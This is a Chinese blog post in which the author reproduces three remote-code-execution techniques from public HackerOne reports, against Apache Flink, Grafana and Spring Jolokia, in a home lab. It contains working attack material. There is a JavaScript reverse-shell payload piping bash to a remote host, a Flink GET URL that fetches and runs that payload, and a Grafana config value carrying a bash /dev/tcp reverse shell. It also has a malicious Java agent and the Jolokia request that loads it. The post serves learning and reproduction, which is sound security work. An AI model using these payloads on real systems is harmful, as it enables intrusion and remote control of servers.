# 关于HackerOne上Grafana、jolokia、Flink攻击手法的学习 - 跳跳糖
那天凑巧上HackerOne看看，所以`jarij`的[漏洞报告](https://hackerone.com/jarij?type=user)刚一放出来就看到了。但是看完三篇RCE的报告  
\- Apache Flink RCE via GET jar/plan API Endpoint  
\- aiven_ltd Grafana RCE via SMTP server parameter injection  
\- \[Kafka Connect\] \[JdbcSinkConnector\]\[HttpSinkConnector\] RCE by leveraging file upload via SQLite JDBC driver and SSRF to internal Jolokia

后，想要搭建本地环境去复现，却无从下手。因为确实没有接触并实际使用过这些产品。也不知道一些功能如何去使用，如：  
\- 如何部署flink的job  
\- 如何新建一个grafana的dashboard等操作。

直到`chybeta`师傅在知识星球发了[文章](https://t.zsxq.com/08Wdz8Y6o)，及`pyn3rd`师傅发的文章[一种JDBC Attack的新方式](http://tttang.com/archive/1831/)，我决定去学一下并搭建本地环境去复现`jarij`师傅的三篇漏洞报告。

下面将从**环境搭建->攻击**这样简单的两个步骤描述我复现的过程。中间涉及到的一些`Java`特性等知识点并未被充分的描述。这是因为我在学习的过程中，也只是简单理解并会使用，并不能很好的讲述其具体原理。

下文可配合漏洞作者的[ppt](https://github.com/Jarijaas/helsec-1103/blob/master/slides-export.pdf)使用

**版本限制**：

*   jdk>8

[环境搭建](#toc__1)
---------------

*   `Parallels Ubuntu20.04`（IP：10.211.55.3）
*   本机`Macos`（IP：10.211.55.2）
    
*   访问`Flink`[官网](https://www.apache.org/dyn/closer.lua/flink/flink-1.15.2/flink-1.15.2-bin-scala_2.12.tgz)，下载并解压`flink`
    

`wget https://archive.apache.org/dist/flink/flink-1.15.2/flink-1.15.2-bin-scala_2.12.tgz
tar zxvf flink-1.15.2-bin-scala_2.12.tgz` 

[![](https://storage.tttang.com/media/attachment/2022/11/29/7281a84f-1066-4831-aae1-909c57041e9c.png)
](https://storage.tttang.com/media/attachment/2022/11/29/7281a84f-1066-4831-aae1-909c57041e9c.png)

1.  安装`openjdk`

`sudo apt install openjdk-11-jdk
java -version` 

[![](https://storage.tttang.com/media/attachment/2022/11/29/8125ca39-4362-4eba-8656-fe55d3675639.png)
](https://storage.tttang.com/media/attachment/2022/11/29/8125ca39-4362-4eba-8656-fe55d3675639.png)

1.  修改配置文件，放开局域网访问

`sed -i 's/rest.bind-address: localhost/rest.bind-address: 0.0.0.0/' flink-1.15.2/conf/flink-conf.yaml` 

1.  启动flink

`cd flink-1.15.2/bin/
./start-cluster.sh` 

1.  访问Flink服务，查看是否启动成功

[![](https://storage.tttang.com/media/attachment/2022/11/29/b81f00df-ef37-4416-a984-46675d0a25a1.png)
](https://storage.tttang.com/media/attachment/2022/11/29/b81f00df-ef37-4416-a984-46675d0a25a1.png)

[攻击](#toc__2)
-------------

根据[漏洞报告](https://hackerone.com/reports/1418891)，目标环境不能发起post请求，但是可以在控制台执行`job`和发起`ge`t请求。

1.  为模拟目标环境：我们先制作一个job的jar包，并上传运行。文件结构及内容如下：

[![](https://storage.tttang.com/media/attachment/2022/11/29/ec159421-048b-473d-b21c-5e67714f8cf7.png)
](https://storage.tttang.com/media/attachment/2022/11/29/ec159421-048b-473d-b21c-5e67714f8cf7.png)

**MANIFEST.MF**（末尾要有换行符）

`Manifest-Version: 1.0
Main-Class: UnboundStreamJob` 

**UnBoundStreamJob.java**

`import java.util.Arrays;
import org.apache.flink.api.common.functions.FlatMapFunction;
import org.apache.flink.api.common.typeinfo.Types;
import org.apache.flink.api.java.tuple.Tuple2;
import org.apache.flink.streaming.api.datastream.DataStreamSource;
import org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;
import org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;

public class UnboundStreamJob {
    @SuppressWarnings("deprecation")
    public static void main(String[] args) throws Exception {
        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();
        DataStreamSource<String> source = env.socketTextStream("127.0.0.1", 9999);
        SingleOutputStreamOperator<Tuple2<String, Integer>> sum = source.flatMap((FlatMapFunction<String, Tuple2<String, Integer>>) (lines, out) -> {
            Arrays.stream(lines.split(" ")).forEach(s -> out.collect(Tuple2.of(s, 1)));
        }).returns(Types.TUPLE(Types.STRING, Types.INT)).keyBy(0).sum(1);
        sum.print("test");
        env.execute();
    }
}` 

**pom.xml**

`<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.xxx</groupId>
    <artifactId>flinkJobdemo</artifactId>
    <version>1.0</version>
    <packaging>jar</packaging>

    <name>flinkdemo</name>
    <url>http://maven.apache.org</url>

    <properties>
        <flink.version>1.13.1</flink.version>
        <scala.binary.version>2.12</scala.binary.version>
        <slf4j.version>1.7.30</slf4j.version>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.apache.flink</groupId>
            <artifactId>flink-java</artifactId>
            <version>${flink.version}</version>
            <scope>provided</scope>
        </dependency>
        <dependency>
            <groupId>org.apache.flink</groupId>
            <artifactId>flink-streaming-java_${scala.binary.version}</artifactId>
            <version>${flink.version}</version>
            <scope>provided</scope>
        </dependency>
        <dependency>
            <groupId>org.apache.flink</groupId>
            <artifactId>flink-clients_${scala.binary.version}</artifactId>
            <version>${flink.version}</version>
            <scope>provided</scope>
        </dependency>
        <dependency>
            <groupId>org.apache.flink</groupId>
            <artifactId>flink-runtime-web_${scala.binary.version}</artifactId>
            <version>${flink.version}</version>
            <scope>provided</scope>
        </dependency>
        <dependency>
            <groupId>org.apache.flink</groupId>
            <artifactId>flink-connector-kafka-0.11_${scala.binary.version}</artifactId>
            <version>1.11.4</version>
        </dependency>
        <dependency>
            <groupId>org.springframework.kafka</groupId>
            <artifactId>spring-kafka</artifactId>
            <version>2.7.8</version>
        </dependency>
        <dependency>
            <groupId>org.slf4j</groupId>
            <artifactId>slf4j-api</artifactId>
            <version>${slf4j.version}</version>
            <scope>provided</scope>
        </dependency>
        <dependency>
            <groupId>org.slf4j</groupId>
            <artifactId>slf4j-log4j12</artifactId>
            <version>${slf4j.version}</version>
            <scope>provided</scope>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-to-slf4j</artifactId>
            <version>2.14.0</version>
            <scope>provided</scope>
        </dependency>
    </dependencies>
    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <version>3.1</version>
                <configuration>
                    <source>1.8</source>
                    <target>1.8</target>
                </configuration>
            </plugin>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-shade-plugin</artifactId>
                <version>3.2.4</version>
                <executions>
                    <execution>
                        <phase>package</phase>
                        <goals>
                            <goal>shade</goal>
                        </goals>
                        <configuration>
                            <artifactSet>
                                <excludes>
                                    <exclude>com.google.code.findbugs:jsr305</exclude>
                                    <exclude>org.slf4j:*</exclude>
                                    <exclude>log4j:*</exclude>
                                </excludes>
                            </artifactSet>
                            <filters>
                                <filter>
                                    <!-- Do not copy the signatures in the META-INF folder.
 Otherwise, this might cause SecurityExceptions when using the JAR. -->
                                    <artifact>*:*</artifact>
                                    <excludes>
                                        <exclude>META-INF/*.SF</exclude>
                                        <exclude>META-INF/*.DSA</exclude>
                                        <exclude>META-INF/*.RSA</exclude>
                                    </excludes>
                                </filter>
                            </filters>
                            <transformers combine.children="append">
                                <transformer implementation="org.apache.maven.plugins.shade.resource.ServicesResourceTransformer">
                                </transformer>
                            </transformers>
                        </configuration>
                    </execution>
                </executions>
            </plugin>
        </plugins>
    </build>
</project>` 

使用`Artifacts`打包，从左往右依次点击蓝色高亮选项（选Empty下面的）

[![](https://storage.tttang.com/media/attachment/2022/11/29/7f769d45-8621-46d1-9ee3-429d5fcc7514.png)
](https://storage.tttang.com/media/attachment/2022/11/29/7f769d45-8621-46d1-9ee3-429d5fcc7514.png)

配置成如下图所示

[![](https://storage.tttang.com/media/attachment/2022/11/29/b435a5d3-8961-4b2e-848a-b2228b2bd1f5.png)
](https://storage.tttang.com/media/attachment/2022/11/29/b435a5d3-8961-4b2e-848a-b2228b2bd1f5.png)

点击`OK`

[![](https://storage.tttang.com/media/attachment/2022/11/29/6b800225-3f08-48b4-ae41-064d5591b57a.png)
](https://storage.tttang.com/media/attachment/2022/11/29/6b800225-3f08-48b4-ae41-064d5591b57a.png)

从上到下，依次点击蓝色高亮选项

[![](https://storage.tttang.com/media/attachment/2022/11/29/7a4bdbb9-ad7a-4563-8663-6689efc785bd.png)
](https://storage.tttang.com/media/attachment/2022/11/29/7a4bdbb9-ad7a-4563-8663-6689efc785bd.png)

点击Build，即可在`out`目录找到打包后的`jar`包

[![](https://storage.tttang.com/media/attachment/2022/11/29/ded17938-b91e-49ec-8f11-976176fad6ad.png)
](https://storage.tttang.com/media/attachment/2022/11/29/ded17938-b91e-49ec-8f11-976176fad6ad.png)

1.  上传打包后的jar包

[![](https://storage.tttang.com/media/attachment/2022/11/29/1fdc2237-3886-4f37-963a-56e568e38226.png)
](https://storage.tttang.com/media/attachment/2022/11/29/1fdc2237-3886-4f37-963a-56e568e38226.png)

正常情况下，会自动显示`Entry-Class`。点击Submit

1.  本机（10.211.55.2）启动一个`http.server`，目录下放`a.js`，内容如下

`var host="10.211.55.2";
var port=8044;
var cmd="/bin/bash";
var p=new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (e){}};p.destroy();s.close();` 

启动服务，并测试服务可用

`python3 -m http.server 8000` 

[![](https://storage.tttang.com/media/attachment/2022/11/29/fcf15a94-b7b0-4e98-807f-14cfe1644928.png)
](https://storage.tttang.com/media/attachment/2022/11/29/fcf15a94-b7b0-4e98-807f-14cfe1644928.png)

1.  在本机（10.211.55.2）监听8044端口

[![](https://storage.tttang.com/media/attachment/2022/11/29/2addb319-9fb6-42e7-b42c-f64ef495e3cd.png)
](https://storage.tttang.com/media/attachment/2022/11/29/2addb319-9fb6-42e7-b42c-f64ef495e3cd.png)

1.  攻击

访问 [http://10.211.55.3:8081/jars/](http://10.211.55.3:8081/jars/)

[![](https://storage.tttang.com/media/attachment/2022/11/29/d5415196-0d39-4ace-bc3e-c59506fcc40f.png)
](https://storage.tttang.com/media/attachment/2022/11/29/d5415196-0d39-4ace-bc3e-c59506fcc40f.png)

浏览器访问（`{idvalue}`替换为上图的`e3ea857b-4b5e-4889-8a03-3bc1fcfbd04a_flinkJobdemo.jar`

`http://10.211.55.3:8081/jars/{idvalue}/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load(%22http://10.211.55.2:8000/a.js%22)&parallelism=1` 

如下图`a.js`被访问，`nc`接收到反弹的shell

[![](https://storage.tttang.com/media/attachment/2022/11/29/f30c3142-d62a-41a5-86f1-d21d0e8223d4.png)
](https://storage.tttang.com/media/attachment/2022/11/29/f30c3142-d62a-41a5-86f1-d21d0e8223d4.png)

[注意：](#toc__3)
--------------

1.  复现过程中出错，可能会导致`flink`服务`shutdown`，需要手动`kill`进程ID
2.  根据[官方文档最新](https://nightlies.apache.org/flink/flink-docs-master/docs/ops/rest_api/)显示，`/jars/:jarid/plan`只支持`post`请求。但经过测试还是可以用`get`进行访问
3.  尝试挖掘`jdk8`及以下是否有可利用的main函数，未果

[参考：](#toc__4)
--------------

*   [https://hackerone.com/reports/1418891](https://hackerone.com/reports/1418891)
*   [https://blog.csdn.net/feinifi/article/details/121293135](https://blog.csdn.net/feinifi/article/details/121293135)
*   [https://nightlies.apache.org/flink/flink-docs-master/docs/ops/rest_api/](https://nightlies.apache.org/flink/flink-docs-master/docs/ops/rest_api/)

[环境搭建](#toc__5)
---------------

`VMware-ubuntu20.04`下执行该命令

`sudo apt-get install -y adduser libfontconfig1
wget https://dl.grafana.com/enterprise/release/grafana-enterprise_7.5.4_amd64.deb
sudo dpkg -i grafana-enterprise_7.5.4_amd64.deb

sudo grafana-cli plugins install grafana-image-renderer 3.0.0
sudo apt-get install libx11-6 libx11-xcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrender1 libxtst6 libglib2.0-0 libnss3 libcups2  libdbus-1-3 libxss1 libxrandr2 libgtk-3-0 libasound2 libxcb-dri3-0 libgbm1 libxshmfence1 -y

sudo systemctl daemon-reload
sudo systemctl start grafana-server
sudo systemctl status grafana-server` 

[攻击过程](#toc__6)
---------------

1.  修改配置文件`grafana.ini`的内容

`sudo vim /etc/grafana/grafana.ini
rendering_args = --renderer-cmd-prefix=bash -c bash$IFS-l$IFS>$IFS/dev/tcp/127.0.0.1/4444$IFS0<&1$IFS2>&1` 

[![](https://storage.tttang.com/media/attachment/2022/11/29/a46ef87c-1f52-42f4-bc33-7d6f782990a6.png)
](https://storage.tttang.com/media/attachment/2022/11/29/a46ef87c-1f52-42f4-bc33-7d6f782990a6.png)

重启grafana服务

`sudo systemctl restart grafana-server` 

1.  监听`VMware-ubuntu20.04`的`4444`端口

[![](https://storage.tttang.com/media/attachment/2022/11/29/64e1f230-86e6-4dbb-8a9e-6c09df087358.png)
](https://storage.tttang.com/media/attachment/2022/11/29/64e1f230-86e6-4dbb-8a9e-6c09df087358.png)

1.  访问`http://{VMware-ubuntu20.04}:3000`，登录后，新建一个`dashboard`（默认的即可）

[![](https://storage.tttang.com/media/attachment/2022/11/29/f30b0209-2f81-43f2-9bd8-acf29d537414.png)
](https://storage.tttang.com/media/attachment/2022/11/29/f30b0209-2f81-43f2-9bd8-acf29d537414.png)

点击`share`

[![](https://storage.tttang.com/media/attachment/2022/11/29/a305e4bd-babd-40dc-8540-6fa9a5747dce.png)
](https://storage.tttang.com/media/attachment/2022/11/29/a305e4bd-babd-40dc-8540-6fa9a5747dce.png)

点击`direct link rendered image`

[![](https://storage.tttang.com/media/attachment/2022/11/29/de976b1e-25ed-4a61-944f-0b84c221fa9b.png)
](https://storage.tttang.com/media/attachment/2022/11/29/de976b1e-25ed-4a61-944f-0b84c221fa9b.png)

1.  查看`nc`监听窗口，执行命令成功

[![](https://storage.tttang.com/media/attachment/2022/11/29/e0764a01-9c52-439b-a353-6f82104edf7d.png)
](https://storage.tttang.com/media/attachment/2022/11/29/e0764a01-9c52-439b-a353-6f82104edf7d.png)

[注意](#toc__7)
-------------

*   经过测试，要使用`grafana 7`才能成功。如果使用`grafana 8`及其以上，配置了`rendering_args`参数后使用`/render`功能会立即报错无法加载`chrome`进程等（我tm找了好久的原因，一度放弃= =，以为是环境问题，结果是版本问题，但我没有进一步探寻为什么高版本不行了）；同时高版本下`rendering_args`参数值最后的特殊字符也会被`urlencode`（图丢了略
    
*   关于`grafana-image-renderer`的版本，因为中间我尝试使用了`docker grafana 7.5.4`配合`docker grafana-image-renderer latest`搭建环境，但是报错了，所以就选择了`3.0.0`版本。故本文也延用了该版本。
    

[参考文章](#toc__8)
---------------

*   [https://grafana.com/grafana/download?pg=get&platform=linux&plcmt=selfmanaged-box1-cta1](https://grafana.com/grafana/download?pg=get&platform=linux&plcmt=selfmanaged-box1-cta1)
*   [https://grafana.com/docs/grafana/v9.0/setup-grafana/installation/debian/#2-start-the-server](https://grafana.com/docs/grafana/v9.0/setup-grafana/installation/debian/#2-start-the-server)

**版本限制：** 

*   大于等于JDK9

`JDK8`及其以下的`jolokia`的`com.sun.management`未能找到`jvmtiAgentLoad`操作。

[环境搭建](#toc__9)
---------------

**Macos下idea直接启动`Spring`服务（JDK11）**

配置一个存在`actuator/jolokia`接口的`Spring`服务，可以参考`Landgrey`师父的[环境](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce)。配置好`Idea`后启动服务

[![](https://storage.tttang.com/media/attachment/2022/11/29/6093b11f-239a-4503-8aed-755bbd586c80.png)
](https://storage.tttang.com/media/attachment/2022/11/29/6093b11f-239a-4503-8aed-755bbd586c80.png)

使用浏览器访问 **[http://127.0.0.1:9094](http://127.0.0.1:9094/)**

[![](https://storage.tttang.com/media/attachment/2022/11/29/4d7c76c2-69aa-4be2-bd6b-1ff95917c080.png)
](https://storage.tttang.com/media/attachment/2022/11/29/4d7c76c2-69aa-4be2-bd6b-1ff95917c080.png)

如上图所示，环境搭建成功

[攻击](#toc__10)
--------------

1.  访问: [http://localhost:9094/jolokia/list](http://localhost:9094/jolokia/list) 搜索`jvmtiAgentLoad`，可以看到存在该操作。

[![](https://storage.tttang.com/media/attachment/2022/11/29/9204fb81-d2a5-4195-aaf3-24cafc614125.png)
](https://storage.tttang.com/media/attachment/2022/11/29/9204fb81-d2a5-4195-aaf3-24cafc614125.png)

该操作的利用涉及到一个概念`JVMTI`，参考`pyn3rd`师傅的[文章](http://tttang.com/archive/1831/#toc_jvmtiinstrument)。大概了解是什么意思后，我们知道需要实现一个`Java Agent Jar`，供`jvmtiAgentLoad`加载实现RCE。

1.  实现`JavaAgent Jar`。其目录结构，及各个文件内容如下：

`j7ur8@192 /tmp % tree evilagent 
evilagent
├── META-INF
│   └── MANIFEST.MF
├── evil.jar
└── org
    └── example
        └── JavaAgent.java

3 directories, 3 files
j7ur8@192 /tmp % cat evilagent/META-INF/MANIFEST.MF 
Manifest-Version: 1.0
Agent-Class: org.example.JavaAgent

j7ur8@192 /tmp % cat evilagent/org/example/JavaAgent.java
package org.example;

import java.lang.instrument.Instrumentation;

public class JavaAgent {
    private static final String RCE_COMMAND = "open -a Calculator.app";
    public static void agentmain(String args, Instrumentation inst){
        System.out.println("success123123");
        try{
           Runtime.getRuntime().exec(RCE_COMMAND);
        }catch (Exception e){
       e.printStackTrace();
    }
    System.out.println("fail"); 
    }

}
j7ur8@192 /tmp %` 

将其打包成`jar`文件

`javac org/example/JavaAgent.java
jar cfvm evil.jar META-INF/MANIFEST.MF . .` 

[![](https://storage.tttang.com/media/attachment/2022/11/29/2855d9e9-2440-468c-8d4d-23527b793aee.png)
](https://storage.tttang.com/media/attachment/2022/11/29/2855d9e9-2440-468c-8d4d-23527b793aee.png)

1.  使用`jvmtiAgentLoad`操作加载恶意`JavaAgent`

`http://127.0.0.1:9094/jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/tmp!/evilagent!/evil.jar` 

成功弹出计算器

[![](https://storage.tttang.com/media/attachment/2022/11/29/a6abebe8-badc-4d8c-8797-4e964604f008.png)
](https://storage.tttang.com/media/attachment/2022/11/29/a6abebe8-badc-4d8c-8797-4e964604f008.png)

[参考](#toc__11)
--------------

*   [https://hackerone.com/reports/1547877](https://hackerone.com/reports/1547877)
*   [http://tttang.com/archive/1831/](http://tttang.com/archive/1831/)
*   [https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce](https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce)

上述三种攻击手法的环境要求基本都需要`JDK>8`，这样的话，了解和熟悉专业产品才能进行更好的攻击吧。